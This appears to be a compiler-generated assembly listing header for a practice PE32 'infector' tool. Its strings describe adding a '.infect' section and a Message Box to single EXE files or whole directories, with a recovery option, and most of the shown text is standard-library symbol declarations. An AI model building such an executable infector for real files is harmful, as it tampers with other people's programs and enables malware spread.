; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33521.0 

	TITLE	C:\masm32\Code\ASMPractice\demo1\demo3\infected.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

CONST	SEGMENT
$SG147748 DB	'.infect', 00H
$SG147750 DB	'PE section already exists', 00H
	ORG $+2
$SG147751 DB	'.infect', 00H
$SG147865 DB	'Error: Fail to open file ', 00H
	ORG $+2
$SG147867 DB	'Error: Fail to map file into memory', 00H
$SG147869 DB	'Error: Fail to load file', 00H
	ORG $+3
$SG147871 DB	'Error: Fail to load file', 00H
	ORG $+3
$SG147873 DB	'Error: Fail to read file', 00H
	ORG $+3
$SG147875 DB	'Error: Fail to load DOS header', 00H
	ORG $+1
$SG147877 DB	'Error: Fail to load NT header', 00H
	ORG $+2
$SG147879 DB	'.infect', 00H
$SG147880 DB	'Success to recover file ', 00H
	ORG $+3
$SG147946 DB	'Error: Invalid file, try another one', 00H
	ORG $+3
$SG147948 DB	' empty, try another one', 00H
$SG147949 DB	'Error: File ', 00H
	ORG $+3
$SG147951 DB	'Error: Fail to read file ', 00H
	ORG $+2
$SG147953 DB	'Error: Invalid path or PE format', 00H
	ORG $+3
$SG147955 DB	' is PE32+, this version works only with PE32', 00H
	ORG $+3
$SG147956 DB	'Error: ', 00H
$SG147958 DB	'Error: Fail to create new section into ', 00H
$SG147960 DB	'Error: Fail to infect Message Box into ', 00H
$SG147961 DB	'Success to infect Message Box into ', 00H
$SG148175 DB	'.exe', 00H
	ORG $+3
$SG148233 DB	': A simple utility for indecting Message Box into any PE'
	DB	'32 EXE file', 00H
$SG148234 DB	09H, 00H
	ORG $+2
$SG148235 DB	' -f <file.exe> -r', 00H
	ORG $+2
$SG148236 DB	09H, 'Example:', 09H, 00H
	ORG $+1
$SG148237 DB	09H, 'Usage', 09H, 09H, 'Description', 00H
	ORG $+4
$SG148238 DB	09H, '-----', 09H, 09H, '--------------------------------'
	DB	'---------------------------------', 00H
	ORG $+2
$SG148239 DB	09H, ' -f', 09H, '        Infect Message Box into only on'
	DB	'e file', 00H
	ORG $+1
$SG148240 DB	09H, ' -d', 09H, '        Infect Message Box into one dir'
	DB	'ectory', 00H
	ORG $+1
$SG148241 DB	09H, ' -r', 09H, '        Recover file to original state', 00H
$SG148243 DB	'-r', 00H
	ORG $+1
$SG148248 DB	'-f', 00H
	ORG $+1
$SG148250 DB	'Error: invalid file', 00H
$SG148252 DB	'-d', 00H
	ORG $+1
$SG148254 DB	'Error: invalid directory', 00H
	ORG $+3
$SG148256 DB	'-f', 00H
	ORG $+1
$SG148258 DB	'Error: invalid file', 00H
CONST	ENDS
PUBLIC	_wmemset
PUBLIC	?max@?$numeric_limits@H@std@@SAHXZ		; std::numeric_limits<int>::max
PUBLIC	??2@YAPAXIPAX@Z					; operator new
PUBLIC	??0exception@std@@QAE@QBD@Z			; std::exception::exception
PUBLIC	??0exception@std@@QAE@QBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QAE@ABV01@@Z			; std::exception::exception
PUBLIC	??1exception@std@@UAE@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UBEPBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UAEPAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AAE@QBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UAE@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QAE@ABV01@@Z			; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UAEPAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QAE@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UAE@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QAE@ABV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UAEPAXI@Z		; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QAEXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z	; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z	; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?compare@?$_WChar_traits@_W@std@@SAHQB_W0I@Z	; std::_WChar_traits<wchar_t>::compare
PUBLIC	?length@?$_WChar_traits@_W@std@@SAIPB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z	; std::_Char_traits<char,int>::copy
PUBLIC	?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z	; std::_Char_traits<char,int>::move
PUBLIC	?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z	; std::_Narrow_char_traits<char,int>::length
PUBLIC	?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z ; std::_Narrow_char_traits<char,int>::assign
PUBLIC	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
PUBLIC	?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
PUBLIC	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
PUBLIC	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ	; std::_Narrow_char_traits<char,int>::eof
PUBLIC	??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z ; std::literals::string_view_literals::operator "" sv
PUBLIC	??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
PUBLIC	??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBDI@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
PUBLIC	?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
PUBLIC	?empty@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_string_view<char,std::char_traits<char> >::empty
PUBLIC	?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ ; std::basic_string_view<char,std::char_traits<char> >::data
PUBLIC	??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@3@PB_WI@Z ; std::literals::string_view_literals::operator "" sv
PUBLIC	??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_W@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
PUBLIC	??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
PUBLIC	?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
PUBLIC	?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::empty
PUBLIC	?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@D@std@@QAE@XZ			; std::allocator<char>::allocator<char>
PUBLIC	?deallocate@?$allocator@D@std@@QAEXQADI@Z	; std::allocator<char>::deallocate
PUBLIC	?allocate@?$allocator@D@std@@QAEPADI@Z		; std::allocator<char>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf
PUBLIC	??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_empty
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
PUBLIC	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
PUBLIC	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
PUBLIC	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
PUBLIC	?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data
PUBLIC	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
PUBLIC	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
PUBLIC	?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize
PUBLIC	?reserve@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::reserve
PUBLIC	?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Become_small@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Become_small
PUBLIC	?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos
PUBLIC	?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>
PUBLIC	??0?$allocator@_W@std@@QAE@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QAEXQA_WI@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QAEPA_WI@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAIABV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	?_Check_offset@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEXI@Z ; std::_String_val<std::_Simple_types<wchar_t> >::_Check_offset
PUBLIC	?_Xran@?$_String_val@U?$_Simple_types@_W@std@@@std@@SAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Xran
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@$$QAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::erase
PUBLIC	??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
PUBLIC	?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::push_back
PUBLIC	?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
PUBLIC	?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
PUBLIC	?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
PUBLIC	?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::resize
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Eos
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Orphan_all@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Orphan_all
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAEAAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QBEABV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
PUBLIC	??1runtime_error@std@@UAE@XZ			; std::runtime_error::~runtime_error
PUBLIC	??0runtime_error@std@@QAE@ABV01@@Z		; std::runtime_error::runtime_error
PUBLIC	??_Gruntime_error@std@@UAEPAXI@Z		; std::runtime_error::`scalar deleting destructor'
PUBLIC	?generic_category@std@@YAABVerror_category@1@XZ	; std::generic_category
PUBLIC	?iostream_category@std@@YAABVerror_category@1@XZ ; std::iostream_category
PUBLIC	?system_category@std@@YAABVerror_category@1@XZ	; std::system_category
PUBLIC	??1error_category@std@@UAE@XZ			; std::error_category::~error_category
PUBLIC	?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z ; std::error_category::default_error_condition
